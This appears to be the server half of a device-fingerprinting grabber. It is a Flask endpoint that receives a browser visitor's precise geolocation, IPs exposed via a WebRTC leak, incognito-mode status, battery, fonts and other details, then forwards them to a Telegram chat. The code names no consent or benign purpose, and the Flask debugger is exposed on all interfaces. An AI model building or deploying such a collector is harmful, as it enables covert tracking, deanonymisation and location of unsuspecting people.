import os
from flask import Flask, request
from dotenv import load_dotenv
from telegram import Bot
from telegram.error import TelegramError

# Load environment variables
load_dotenv()
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

bot = Bot(token=TELEGRAM_BOT_TOKEN)

app = Flask(__name__)

@app.route('/collect-info', methods=['POST'])
def collect_info():
    try:
        device_info = request.json

        # Handling missing or undefined properties
        supported_fonts = ", ".join(device_info.get("supportedFonts", [])) if isinstance(device_info.get("supportedFonts"), list) else "Not Available"
        webrtc_ips = device_info.get("webrtcIps", "Not Available")

        message = f"""
Device Info:
- User Agent: {device_info.get('userAgent', 'N/A')}
- Language: {device_info.get('language', 'N/A')}
- Platform: {device_info.get('platform', 'N/A')}
- Screen Width: {device_info.get('screenWidth', 'N/A')}
- Screen Height: {device_info.get('screenHeight', 'N/A')}
- Screen Orientation: {device_info.get('screenOrientation', 'N/A')}
- Battery Level: {str(device_info.get('batteryLevel')) + '%' if 'batteryLevel' in device_info else 'N/A'}
- Charging: {'Yes' if device_info.get('charging') else 'No' if 'charging' in device_info else 'N/A'}
- Referrer: {device_info.get('referrer', 'N/A')}
- Geolocation: {f"{device_info.get('latitude')}, {device_info.get('longitude')} (Accuracy: {device_info.get('accuracy', 'N/A')} meters)" if 'latitude' in device_info and 'longitude' in device_info else 'Not Available'}
- Network Type: {device_info.get('networkType', 'N/A')}
- Downlink Speed: {device_info.get('downlink', 'N/A')} Mbps
- Browser: {device_info.get('browser', 'N/A')}
- Operating System: {device_info.get('operatingSystem', 'N/A')}
- Incognito Mode: {'Yes' if device_info.get('privateMode') else 'No' if 'privateMode' in device_info else 'N/A'}
- Supported Fonts: {supported_fonts}
- WebRTC IP Leak: {webrtc_ips}
"""

        # Send device info to Telegram
        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message)
        return {"status": "success", "message": "Device info sent to Telegram bot."}, 200

    except TelegramError as e:
        print(f"Error sending message to Telegram: {e}")
        return {"status": "error", "message": "Failed to send info to Telegram."}, 500

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=3000, debug=True)
